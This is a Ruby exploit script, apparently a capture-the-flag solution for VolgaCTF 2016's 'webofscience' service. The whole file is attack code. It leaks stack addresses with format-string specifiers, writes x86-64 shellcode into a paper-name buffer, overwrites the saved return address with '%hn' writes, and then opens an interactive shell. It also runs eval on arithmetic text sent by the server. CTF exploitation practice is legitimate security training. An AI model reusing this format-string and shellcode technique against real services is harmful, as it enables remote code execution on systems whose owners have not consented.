#!/usr/bin/ruby
require '~/Tools/pwnlib'

local = false#true

if local == false#true
	host, port = '127.0.0.1',4444
else
	host, port = 'webofscience.2016.volgactf.ru',45678
end

def _exit(r)
	r.sendline("5")
end

def add_paper(r,name=nil,author=nil,abstract=nil,tag=nil,view=false)
	r.recv_until(">")
	r.sendline("1")
	
	add_paper_name(r,name) if name != nil
	add_paper_authors(r,author) if author != nil
	add_paper_abstract(r,abstract) if abstract != nil
	add_paper_tag(r,tag) if tag != nil
	if view != false
		leak = view(r)
	end
	quit_add(r)
	return leak[0]
end
def view(r)
	r.recv_until(">")
	r.sendline("5")
	r.recv_until("Abstract:\n	")
	leak = r.recv_capture(/(.*)\n/)
	puts r.recv_until("Add paper menu")
	return leak
end
def add_paper_tag(r,tag)
	r.recv_until(">")
        r.sendline("4")
        r.recv_until("Paper tags:")
        r.sendline(tag)
end
def add_paper_abstract(r,abstract)
	r.recv_until(">")
        r.sendline("3")
        r.recv_until("Paper abstract:")
        r.sendline(abstract)
end
def add_paper_authors(r,author)
	r.recv_until(">")
        r.sendline("2")
        r.recv_until("Paper authors:")
        r.sendline(author)
end
def add_paper_name(r,name)
	r.recv_until(">")
	r.sendline("1")
	r.recv_until("Paper name:")
	r.sendline(name)
end
def quit_add(r)
	r.recv_until(">")
        r.sendline("6")
end
def p64(*address)
	return address.pack("Q*")
end
PwnTube.open(host, port) do |r|
	r.recv()
	r.sendline("%p."*20)
	puts r.recv_until("Alright, pass a little test first, would you.")
	
	10.times do |c|
		num = r.recv_capture(/(\d* \+ \d*) = \?/)
		ans = eval("#{num[0]}").to_s
		puts "#{num[0]} = #{ans}"
		r.sendline(ans)
	end
	# first add paper name is in 0x6020a0
	leak_rbp = add_paper(r,name=PwnLib.shellcode_x86_64,author=nil,abstract="%8$p",tag=nil,view=true)
	puts leak_rbp.to_i(16)
	#name=nil,author=nil,abstract=nil,tag=nil
	#leak = "%16$p.%17$p"
	#payload = p64(0x7a7a7a7a7a7a,0x616161616161)
	leak = "%8352c%16$hn%16256c%17$hn"
	payload = p64(leak_rbp.to_i(16)+8,leak_rbp.to_i(16)+9)
	leak = add_paper(r,name=payload,author=nil,abstract=leak,tag=nil,view=true)
	#puts leak
	#puts leak.ljust(8,"\0").unpack("Q")[0].to_s(16)
	
	_exit(r)
	r.interactive()
end
